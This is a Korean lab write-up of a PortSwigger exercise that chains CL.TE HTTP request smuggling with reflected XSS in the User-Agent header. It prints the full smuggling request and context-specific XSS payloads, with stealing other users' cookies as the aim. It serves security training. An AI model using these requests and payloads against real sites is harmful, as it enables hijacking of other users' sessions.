# Lab: Exploiting HTTP request smuggling to deliver reflected XSS

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — CL.TE / 반사형 XSS 전달
- **링크**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

## 목표

`User-Agent` 헤더가 HTML 응답에 반사되는 취약점을 확인하고, CL.TE 스머글링으로 XSS 페이로드를 다른 사용자에게 전달한다.

## 이전 랩들과의 차이

```
[003/004 — 접근 제어 우회]
  공격자가 직접 이익 (admin 접근)

[005 — 헤더 추출]
  정보 수집 후 우회에 활용

[006 — 요청 캡처]
  다른 사용자의 쿠키 탈취

[007 (이번) — XSS 전달]
  다른 사용자의 브라우저에서 스크립트 실행
  → 쿠키 탈취, UI 변조, 피싱 등 가능
```

## 취약점 조합

```
[단독 취약점의 한계]

  반사형 XSS (User-Agent):
    공격자 자신만 영향 받음
    → 브라우저가 자신의 User-Agent 를 전송하므로
      자기 자신에게만 XSS 발생 → 실제 공격 불가

  HTTP Request Smuggling (단독):
    요청 경계 조작 가능
    → 단독으로는 직접적인 데이터 탈취 어려움

[조합 시 효과]
  스머글링으로 XSS 페이로드가 담긴 요청을 버퍼에 심음
  → 다음 사용자가 해당 응답을 받음
  → 공격자가 제어하는 User-Agent 가 피해자 브라우저에서 실행됨
  → 반사형 XSS 가 실제 공격 가능해짐
```

## 취약 지점 확인

```
GET /post?postId=1 에서 User-Agent 가 HTML 에 반사됨:

  요청:
    GET /post?postId=1 HTTP/1.1
    User-Agent: test-value

  응답 HTML:
    <input name="user-agent" value="test-value">
                                    ↑
                            User-Agent 값이 그대로 반사

  XSS 페이로드:
    User-Agent: "><script>alert(document.cookie)</script>
    → <input name="user-agent" value=""><script>alert(document.cookie)</script>">
```

## 공격 패킷

### Attack 요청

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: [cl]
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /post?postId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
User-Agent: "><script>alert(document.cookie)</script>
Content-Length: 20

```

```
핵심:
  버퍼에 심긴 GET /post?postId=1:
    User-Agent: "><script>alert(document.cookie)</script>
    Content-Length: 20  ← follow-up 바이트로 body 완성 대기

  follow-up(다른 사용자 요청) 도착 시:
    앞 20바이트가 body 로 소비 → GET /post?postId=1 처리 완료
    → User-Agent 값이 HTML 에 반사된 응답 반환
    → 피해자 브라우저에서 XSS 실행
```

### Follow-up / 피해자 요청

피해자(봇)가 어떤 페이지든 요청하면:

```
백엔드: 버퍼 GET /post?postId=1 + 피해자 요청 앞 20바이트로 body 완성
→ GET /post 응답 (XSS payload 포함) 을 피해자에게 반환
→ 피해자 브라우저: <script>alert(document.cookie)</script> 실행
```

## 동작 흐름 요약

```
[1] 공격자: Attack 전송
    버퍼: GET /post?postId=1 (User-Agent: XSS payload, CL:20, 미완성)

[2] 봇(피해자): GET / 요청
    백엔드: 버퍼 GET /post?postId=1 + GET / 앞 20바이트 → body 완성
    → GET /post?postId=1 처리
    → HTML 응답 (XSS payload 포함) → 피해자에게 반환

[3] 피해자 브라우저: XSS 실행
    document.cookie → 쿠키 탈취
```

## 반사형 XSS 와 스머글링의 시너지

```
[기존 반사형 XSS 공격 방법]
  공격자 → 피해자에게 악성 링크 전송
  피해자 → 링크 클릭 → 피해자 브라우저에서 XSS 실행
  ↑ 사회공학적 요소 필요 (클릭 유도)

[스머글링 + 반사형 XSS]
  피해자가 어떤 요청을 하든 상관없음
  공격자가 설치한 함정에 피해자 요청이 걸림
  → 사회공학 없이 XSS 전달 가능
  → User-Agent 같이 직접 제어 불가능한 헤더의 XSS 도 전달 가능
```

## 핵심 정리

- `User-Agent` 헤더가 HTML 에 반사(reflect)되면 XSS 취약점이 발생하지만, 일반적으로 공격자 자신에게만 영향을 준다.
- CL.TE 스머글링으로 XSS 페이로드가 담긴 요청을 백엔드 버퍼에 심으면, **다음 사용자의 브라우저에서** XSS 가 실행된다.
- `Content-Length: 20` 설정으로 백엔드가 follow-up(피해자) 바이트를 기다리게 해야 응답이 피해자에게 정확히 매핑된다.
- 반사형 XSS + HTTP Request Smuggling 의 조합은 **사회공학 없이 XSS 를 전달**할 수 있는 강력한 공격이다.

## 배운 점

### 1. User-Agent 가 반사되는 위치 유형

```
<input type="hidden" name="user-agent" value="[UA]">  ← attribute 삽입
<p>Your browser: [UA]</p>                              ← HTML 본문 삽입
<script>var ua = "[UA]";</script>                      ← JS 컨텍스트 삽입

각 컨텍스트별 페이로드:
  attribute: "><script>alert(1)</script>
  HTML:      <script>alert(1)</script>
  JS:        ";alert(1)//
```

### 2. HTTP Request Smuggling 전체 활용 범위

```
탐지     → 001(CL.TE), 002(TE.CL) Differential Response
우회     → 003(CL.TE), 004(TE.CL) 접근 제어 우회
정보추출 → 005 프론트엔드 헤더 추출
세션탈취 → 006 다른 사용자 요청 캡처
XSS전달  → 007 반사형 XSS 전달 (이번)
```

### 3. Content-Length 가 필요한 이유 재확인

```
버퍼: GET /post?postId=1 \r\n User-Agent: <xss> \r\n CL:20 \r\n\r\n
                                                              ↑
                                               body 20바이트를 기다림

→ 백엔드가 피해자 요청을 기다리는 동안 연결 유지
→ 피해자 요청 20바이트 소비 → GET /post 처리 → XSS 응답 → 피해자에게 매핑
```
